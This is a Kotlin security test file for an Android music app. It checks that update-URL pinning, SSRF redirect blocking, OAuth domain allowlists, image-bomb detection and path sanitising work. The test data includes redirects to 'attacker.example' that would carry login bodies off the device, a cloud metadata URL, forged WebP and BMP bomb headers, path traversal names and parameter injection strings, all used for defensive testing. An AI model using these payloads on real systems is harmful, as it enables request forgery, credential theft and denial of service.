        val fallbackPinned = "https://github.com/reneryi7/BreezeMusic-Android/releases/tag/v9.9.9"

        // 攻击者将木马上传至任意 GitHub Release/Issue 获取的多租户 objects.githubusercontent.com 链接必须被拒绝并钉扎回本仓库！
        assertEquals(
            fallbackPinned,
            SecurityGuards.sanitizeUpdateDownloadUrl(
                "https://objects.githubusercontent.com/github-production-release-asset-2e65be/999999999/trojan.apk",
                "v9.9.9"
            )
        )
        assertEquals(
            fallbackPinned,
            SecurityGuards.sanitizeUpdateDownloadUrl(
                "https://release-assets.githubusercontent.com/github-production-release-asset/trojan.apk",
                "v9.9.9"
            )
        )
        assertEquals(
            fallbackPinned,
            SecurityGuards.sanitizeUpdateDownloadUrl(
                "https://github.com/reneryi7/BreezeMusic-Android/issues/999",
                "v9.9.9"
            )
        )

        val poisonedUpdate = UpdateCheckResult.HasUpdate(
            latestVersion = "v9.9.9",
            title = "Poisoned",
            releaseNotes = "Malicious",
            downloadUrl = fallbackPinned,
            publishedAt = "2026-11-08"
        )

        // 1. 仅单一镜像商返回更新（即使同一镜像商 ghfast.top 连续命中 3 个子接口），绝不可达成共识触发更新！
        val sameMirrorTriple = listOf(
            UpdateProbeOutcome("ghfast.top", isAuthoritativeReleaseSource = false, result = poisonedUpdate),
            UpdateProbeOutcome("ghfast.top", isAuthoritativeReleaseSource = false, result = poisonedUpdate),
            UpdateProbeOutcome("ghfast.top", isAuthoritativeReleaseSource = false, result = poisonedUpdate)
        )
        assertNull(evaluateUpdateProbeConsensus(sameMirrorTriple))

        // 2. 两个独立镜像运营方（ghfast.top + gh-proxy.com）返回一致版本号，达成跨源共识
        val crossOperatorConsensus = listOf(
            UpdateProbeOutcome("ghfast.top", isAuthoritativeReleaseSource = false, result = poisonedUpdate),
            UpdateProbeOutcome("gh-proxy.com", isAuthoritativeReleaseSource = false, result = poisonedUpdate)
        )
        assertEquals(poisonedUpdate, evaluateUpdateProbeConsensus(crossOperatorConsensus))

        // 3. 一旦官方权威源明确返回已是最新，直接否决任何镜像伪造的更新
        val officialUpToDate = UpdateCheckResult.UpToDate("v1.3.4", "已是最新")
        val overriddenByOfficial = crossOperatorConsensus + UpdateProbeOutcome(
            providerId = "github.com",
            isAuthoritativeReleaseSource = true,
            result = officialUpToDate
        )
        assertEquals(officialUpToDate, evaluateUpdateProbeConsensus(overriddenByOfficial))
    }

    @Test
    fun `downloadAudioStreamToFile aborts 302 redirect to loopback BEFORE sending SSRF request`() {
        MockWebServer().use { cdnEntryServer ->
            MockWebServer().use { internalVictimServer ->
                internalVictimServer.enqueue(MockResponse().setResponseCode(200).setBody("INTERNAL_SECRET_AUDIO"))
                cdnEntryServer.enqueue(
                    MockResponse()
                        .setResponseCode(302)
                        .addHeader("Location", "http://127.0.0.1:${internalVictimServer.port}/secret")
                )

                val tempDest = Files.createTempFile("breeze_dl_ssrf_", ".mp3").toFile()
                try {
                    try {
                        MusicDownloadManager.downloadAudioStreamToFile(
                            url = "http://127.0.0.1:${cdnEntryServer.port}/track.mp3",
                            destFile = tempDest,
                            expectedSize = 1024L,
                            onProgress = { _, _ -> },
                            allowEntryLoopbackForTest = true
                        )
                        fail("音频下载遇到跳转至 127.0.0.1 的 302 响应时必须在建连前抛出 SecurityException")
                    } catch (_: SecurityException) {
                        // expected
                    }
                    assertEquals("严禁向 302 重定向内网靶机发出任何真实 HTTP 请求", 0, internalVictimServer.requestCount)
                } finally {
                    tempDest.delete()
                }
            }
        }
    }

    @Test
    fun `peekImageDimensions detects lossy VP8 WebP and BMP image bombs and file guards handle trailing spaces and Android sandboxes`() {
        // 1. 构造 16000 x 16000 的有损 WebP ("VP8 " chunk + 关键帧起始码 0x9D 0x01 0x2A)
        val vp8Bomb = ByteArray(30).apply {
            "RIFF".toByteArray(Charsets.US_ASCII).copyInto(this, 0)
            "WEBP".toByteArray(Charsets.US_ASCII).copyInto(this, 8)
            "VP8 ".toByteArray(Charsets.US_ASCII).copyInto(this, 12)
            this[20] = 0x00 // keyframe bit 0 == 0
            this[23] = 0x9D.toByte()
            this[24] = 0x01
            this[25] = 0x2A
            val w = 16000
            val h = 16000
            this[26] = (w and 0xFF).toByte()
            this[27] = ((w shr 8) and 0x3F).toByte()
            this[28] = (h and 0xFF).toByte()
            this[29] = ((h shr 8) and 0x3F).toByte()
        }
        assertEquals(16000 to 16000, SecurityGuards.peekImageDimensions(vp8Bomb))
        assertFalse(SecurityGuards.isSafeImagePayload(vp8Bomb))

        // 2. 构造 20000 x -20000 (Top-Down) 的 BMP 图像头炸弹
        val bmpBomb = ByteBuffer.allocate(54).order(ByteOrder.LITTLE_ENDIAN).apply {
            put('B'.code.toByte())
            put('M'.code.toByte())
            putInt(54) // file size
            putInt(0) // reserved
            putInt(54) // pixel offset
            putInt(40) // BITMAPINFOHEADER size
            putInt(20000) // width
            putInt(-20000) // negative height (top-down DIB)
        }.array()
        assertEquals(20000 to 20000, SecurityGuards.peekImageDimensions(bmpBomb))
        assertFalse(SecurityGuards.isSafeImagePayload(bmpBomb))

        // 3. resolveSafeChildFile 对带尾随空格的 ".. " 与非法字符安全降级而不崩溃或逃逸
        val tempDir = Files.createTempDirectory("breeze_child_guard_").toFile()
        try {
            val dotDotSpace = SecurityGuards.resolveSafeChildFile(tempDir, ".. ")
            assertEquals(tempDir.canonicalPath, dotDotSpace.canonicalFile.parentFile?.path)
            assertEquals("_track_", dotDotSpace.name)

            val fatIllegal = SecurityGuards.resolveSafeChildFile(tempDir, "Song:Name*?\"<>|.mp3.")
            assertEquals("Song_Name______.mp3", fatIllegal.name)
        } finally {
            tempDir.deleteRecursively()
        }

        // 4. 拦截指向外部存储 Android/data 与 Android/obb 应用沙盒的导出目录配置
        val defaultDir = "/storage/emulated/0/Music/ConceptMusic"
        assertEquals(
            defaultDir,
            SecurityGuards.sanitizeSafeExportDirectoryPath(
                "/storage/emulated/0/Android/data/com.other.app/files",
                defaultDir
            )
        )
        assertEquals(
            defaultDir,
            SecurityGuards.sanitizeSafeExportDirectoryPath(
                "/sdcard/Android/obb/com.other.app",
                defaultDir
            )
        )

        // 5. 分享构建器对异常哈希/专辑 ID 参数注入的净化校验
        val craftedSong = Song(
            id = "1",
            hash = "0123456789abcdef0123456789abcdef&evil=1#frag",
            albumId = "999&redirect=https://evil.example",
            title = "Test",
            artist = "Artist"
        )
        val payload = KugouShareManager.buildSongSharePayload(craftedSong)
        assertFalse(payload.conceptWakeupWebUrl.contains("&evil="))
        assertFalse(payload.conceptWakeupWebUrl.contains("&redirect="))
    }

    @Test
    fun `round 2 hardening covers nav route encoding update hop pinning 307 post credential protection and streaming audio tagger`() {
        // 1. Compose Navigation 路由段编码：阻断包含 / ? # % 的外部 ID 引发路由注入或导航异常
        val encodedSeg = SecurityGuards.encodeSafeNavSegment("collection_3_100/../../vip_center?admin=1#frag")
        assertFalse(encodedSeg.contains('/'))
        assertFalse(encodedSeg.contains('?'))
        assertFalse(encodedSeg.contains('#'))
        assertEquals("0", SecurityGuards.encodeSafeNavSegment("   ", fallback = "0"))

        // 2. 在线更新探测逐跳校验：禁止非 HTTPS 与非官方 GitHub 主机跳转
        assertTrue(SecurityGuards.isSafeUpdateProbeHopUrl("https://api.github.com/repos/reneryi7/BreezeMusic-Android/releases/latest", requireGitHubOfficialHost = true))
        assertFalse(SecurityGuards.isSafeUpdateProbeHopUrl("http://api.github.com/repos/reneryi7/BreezeMusic-Android/releases/latest", requireGitHubOfficialHost = true))
        assertFalse(SecurityGuards.isSafeUpdateProbeHopUrl("https://evil.example/repos/reneryi7/BreezeMusic-Android/releases/latest", requireGitHubOfficialHost = true))
        assertFalse(SecurityGuards.isSafeUpdateProbeHopUrl("https://127.0.0.1/releases/latest", requireGitHubOfficialHost = false))

        // 3. 307 Temporary Redirect 保持 POST Body 时的登录接口凭据防泄露校验
        MockWebServer().use { originServer ->
            MockWebServer().use { attackerServer ->
                originServer.enqueue(
                    MockResponse()
                        .setResponseCode(307)
                        .addHeader("Location", "http://evil.example:${attackerServer.port}/v7/login_by_mobile")
                )
                val redirectTestClient = NetworkClientProvider.baseClient.newBuilder()
                    .dns(object : Dns {
                        override fun lookup(hostname: String): List<InetAddress> {
                            return listOf(InetAddress.getByName("127.0.0.1"))
                        }
                    })
                    .build()
                val postReq = Request.Builder()
                    .url("http://127.0.0.1:${originServer.port}/v7/login_by_mobile")
                    .post("{\"mobile\":\"13800138000\",\"params\":\"enc\"}".toByteArray().toRequestBody(null))
                    .build()
                try {
                    redirectTestClient.newCall(postReq).execute().close()
                    fail("307 POST 重定向携带登录 Body 跳往外部非授信主机必须被拦截")
                } catch (e: IOException) {
                    assertTrue(e.message.orEmpty().contains("已拦截携带登录凭证"))
                }
                assertEquals("攻击者服务器绝不能收到 307 重定向的 POST 登录报文", 0, attackerServer.requestCount)
            }
        }

        // 4. 流式音频元数据内嵌器：验证 FLAC 流式写入保留音频帧且拒绝畸形超界块长度
        val tempFlac = Files.createTempFile("breeze_stream_flac_", ".flac").toFile()
        try {
            // 构造最小合法 FLAC: "fLaC" + 最后一个 STREAMINFO 块 (header 0x80, len 34) + 16 字节模拟音频帧
            val streamInfo = ByteArray(34)
            val audioTail = "AUDIO_FRAME_TAIL".toByteArray(Charsets.US_ASCII)
            tempFlac.outputStream().use { out ->
                out.write("fLaC".toByteArray(Charsets.US_ASCII))
                out.write(0x80) // isLast=1, type=0 (STREAMINFO)
                out.write(0)
                out.write(0)
                out.write(34)
                out.write(streamInfo)
                out.write(audioTail)
            }
            val embeddedOk = com.concept.music.service.AudioMetadataEmbedder.embedMetadata(
                tempFlac,
                com.concept.music.service.AudioTagMetadata(
                    title = "安全流式内嵌测试",
                    artist = "BreezeMusic",
                    album = "Security Album",
                    lrcText = "[00:00.00]Safe streaming"
                )
            )
            assertTrue(embeddedOk)
            val tags = com.concept.music.service.AudioMetadataEmbedder.readEmbeddedTagsForVerification(tempFlac)
            assertEquals("安全流式内嵌测试", tags["TITLE"])
            assertEquals("BreezeMusic", tags["ARTIST"])
            val finalBytes = tempFlac.readBytes()
            val tailSlice = finalBytes.copyOfRange(finalBytes.size - audioTail.size, finalBytes.size)
            assertArrayEquals("流式内嵌后尾部音频帧必须原样保留", audioTail, tailSlice)
        } finally {
            tempFlac.delete()
        }
    }

    @Test
    fun `v1_3_6 hardening covers AES-256 session migration fault isolation FLAG_SECURE tapjacking encrypted IPC token and dependency hygiene`() {
        // 1. 验证 SessionStore 密文解析兼容 V2 (AES-256) 与 V1 (平滑迁移) 并拒绝畸形载荷
        val v2 = com.concept.music.data.kugou.parseEncryptedSessionRecord("v2:AAAA:BBBB")
        assertNotNull(v2)
        assertEquals(2, v2!!.version)
        assertEquals("AAAA", v2.ivBase64)
        assertEquals("BBBB", v2.cipherBase64)

        val v1 = com.concept.music.data.kugou.parseEncryptedSessionRecord("CCCC:DDDD")
        assertNotNull(v1)
        assertEquals(1, v1!!.version)
        assertEquals("CCCC", v1.ivBase64)
        assertEquals("DDDD", v1.cipherBase64)

        assertNull(com.concept.music.data.kugou.parseEncryptedSessionRecord(null))
        assertNull(com.concept.music.data.kugou.parseEncryptedSessionRecord(""))
        assertNull(com.concept.music.data.kugou.parseEncryptedSessionRecord("plaintext_token_without_colon"))
        assertNull(com.concept.music.data.kugou.parseEncryptedSessionRecord("v3:AAAA:BBBB"))
        assertNull(com.concept.music.data.kugou.parseEncryptedSessionRecord("v2::BBBB"))

        // 2. 验证单条解密异常 (AEADBadTagException / 畸形 JSON) 不会误判为主密钥永久失效，避免清空多账号会话
        assertFalse(com.concept.music.data.kugou.isKeystoreMasterKeyFatal(javax.crypto.AEADBadTagException("tag mismatch")))
        assertFalse(com.concept.music.data.kugou.isKeystoreMasterKeyFatal(IllegalArgumentException("bad base64")))
        assertTrue(com.concept.music.data.kugou.isKeystoreMasterKeyFatal(java.security.UnrecoverableKeyException("key lost")))
        assertTrue(com.concept.music.data.kugou.isKeystoreMasterKeyFatal(java.security.InvalidKeyException("invalid key")))
        assertTrue(
            com.concept.music.data.kugou.isKeystoreMasterKeyFatal(
                RuntimeException("wrapped", java.security.InvalidKeyException("nested"))
            )
        )

        // 3. 源码级静态合规断言：确认 AES-256 显式密钥长度、加密 IPC 令牌、FLAG_SECURE + filterTouchesWhenObscured 与无冗余依赖
        val root = locateRepoRoot()
        val sessionStoreText = File(root, "app/src/main/java/com/concept/music/data/kugou/SessionStore.kt").readText(Charsets.UTF_8)
        assertTrue("SessionStore 应显式设置 256-bit AES 密钥长度", sessionStoreText.contains(".setKeySize(AES_KEY_SIZE_BITS)") && sessionStoreText.contains("AES_KEY_SIZE_BITS = 256"))
        assertTrue("SessionStore 应显式开启随机化加密", sessionStoreText.contains(".setRandomizedEncryptionRequired(true)"))
        assertFalse("SessionStore 严禁在单条解密异常时调用 secrets.edit().clear()", sessionStoreText.contains("secrets.edit().clear()"))

        val guardsText = File(root, "app/src/main/java/com/concept/music/util/SecurityGuards.kt").readText(Charsets.UTF_8)
        assertTrue("SecurityGuards IPC 令牌应使用 AndroidKeyStore AES-256-GCM 加密存储", guardsText.contains("IPC_KEYSTORE_ALIAS") && guardsText.contains(".setKeySize(256)"))
        assertFalse("SecurityGuards 严禁再将明文 IPC 令牌写入 KEY_INTERNAL_IPC_TOKEN", guardsText.contains("putString(KEY_INTERNAL_IPC_TOKEN,"))
        assertTrue("SecurityGuards 应提供 FLAG_SECURE 与 filterTouchesWhenObscured 窗口防护", guardsText.contains("WindowManager.LayoutParams.FLAG_SECURE") && guardsText.contains("filterTouchesWhenObscured = true"))

        val accountScreensText = File(root, "app/src/main/java/com/concept/music/ui/account/AccountScreens.kt").readText(Charsets.UTF_8)
        assertTrue("LoginScreen 应接入引用计数式安全窗口防护", accountScreensText.contains("SecurityGuards.acquireSensitiveWindowProtection(") && accountScreensText.contains("SecurityGuards.releaseSensitiveWindowProtection("))

        val verificationDialogText = File(root, "app/src/main/java/com/concept/music/ui/account/VerificationDialog.kt").readText(Charsets.UTF_8)
        assertTrue("VerificationDialog 应同时为宿主窗口与独立 Dialog 窗口接入安全窗口防护", verificationDialogText.contains("DialogWindowProvider") && verificationDialogText.contains("SecurityGuards.acquireSensitiveWindowProtection("))

        val gradleText = File(root, "app/build.gradle.kts").readText(Charsets.UTF_8)
        assertFalse("app/build.gradle.kts 不应再包含未使用的 logging-interceptor 依赖", gradleText.contains("logging-interceptor"))
    }

    @Test
    fun `qqQrAuthGateway enforces HTTPS QQ domain whitelist and blocks SSRF redirects and Kugou header leaks`() = kotlinx.coroutines.test.runTest {
        val gateway = com.concept.music.data.kugou.DirectQqQrAuthGateway

        // 1. 仅放行受信任的 QQ OAuth HTTPS 域名，拦截明文 HTTP、子串伪造、凭据注入、私网及无关子域
        assertTrue(gateway.isAllowedQqOAuthUrl("https://openmobile.qq.com/oauth2.0/m_authorize?client_id=101706348"))
        assertTrue(gateway.isAllowedQqOAuthUrl("https://xui.ptlogin2.qq.com/ssl/ptqrshow"))
        assertTrue(gateway.isAllowedQqOAuthUrl("https://ssl.ptlogin2.qq.com/check_sig"))
        assertTrue(gateway.isAllowedQqOAuthUrl("https://ssl.ptlogin2.graph.qq.com/check_sig"))
        assertTrue(gateway.isAllowedQqOAuthUrl("https://graph.qq.com/oauth2.0/authorize"))
        assertTrue(gateway.isAllowedQqOAuthUrl("https://cgi.connect.qq.com/proxy.htm"))

        assertFalse(gateway.isAllowedQqOAuthUrl("http://openmobile.qq.com/oauth2.0/m_authorize"))
        assertFalse(gateway.isAllowedQqOAuthUrl("https://evil-qq.com/ssl/ptqrlogin"))
        assertFalse(gateway.isAllowedQqOAuthUrl("https://openmobile.qq.com@evil.example/oauth2.0/m_authorize"))
        assertFalse(gateway.isAllowedQqOAuthUrl("https://127.0.0.1/ssl/ptqrlogin"))
        assertFalse(gateway.isAllowedQqOAuthUrl("https://169.254.169.254/latest/meta-data"))
        assertFalse(gateway.isAllowedQqOAuthUrl("https://arbitrary-user.qq.com/phish"))

        // 2. 双 MockWebServer 验证：check_sig 返回指向非授信外部主机的 302 时必须在建连前抛 SecurityException，且绝不泄露酷狗内部头
        MockWebServer().use { qqServer ->
            MockWebServer().use { attackerServer ->
                attackerServer.enqueue(MockResponse().setResponseCode(200).setBody("STOLEN"))
                val baseUrl = "http://127.0.0.1:${qqServer.port}"
                qqServer.enqueue(
                    MockResponse()
                        .setResponseCode(200)
                        .setBody("ptuiCB('0','0','$baseUrl/check_sig?s=1','0','登录成功','')")
                )
                qqServer.enqueue(
                    MockResponse()
                        .setResponseCode(302)
                        .addHeader("Location", "https://attacker.example:${attackerServer.port}/capture")
                )

                val testGateway = com.concept.music.data.kugou.DirectQqQrAuthGateway(
                    mAuthorizeBaseUrl = baseUrl,
                    ptLoginBaseUrl = baseUrl,
                    allowLoopbackForTest = true
                )
                val dummySession = com.concept.music.data.kugou.QqQrSession(
                    imageUrl = "data:image/png;base64,AA==",
                    expiresAt = System.currentTimeMillis() + 60_000L,
                    qrsig = "sig",
                    ptQrToken = KugouSigner.hash33("sig"),
                    ptLoginSig = "login_sig",
                    ptOpenLoginData = "appid=716027609",
                    xloginUrl = "$baseUrl/cgi-bin/xlogin?appid=716027609",
                    cookies = mapOf("qrsig" to "sig", "pt_login_sig" to "login_sig")
                )

                try {
                    testGateway.pollQqQr(dummySession)
                    fail("指向非授信域名的 QQ OAuth 302 重定向必须被阻断")
                } catch (e: SecurityException) {
                    assertTrue(
                        "异常信息应明确指向恶意重定向目标: ${e.message}",
                        e.message.orEmpty().contains("attacker.example")
                    )
                }

                assertEquals("应先完成 ptqrlogin 与 check_sig 两跳后再拦截外部重定向", 2, qqServer.requestCount)
                assertEquals("攻击者服务器绝不能收到任何 QQ 重定向请求", 0, attackerServer.requestCount)
                val pollReq = requireNotNull(qqServer.takeRequest(3, java.util.concurrent.TimeUnit.SECONDS))
                for (forbiddenHeader in listOf("dfid", "mid", "kg-rf", "kg-rc", "kg-thash", "x-router")) {
                    assertNull("QQ OAuth 请求绝不能携带酷狗内部头 $forbiddenHeader", pollReq.getHeader(forbiddenHeader))
                }
            }
        }
    }
}
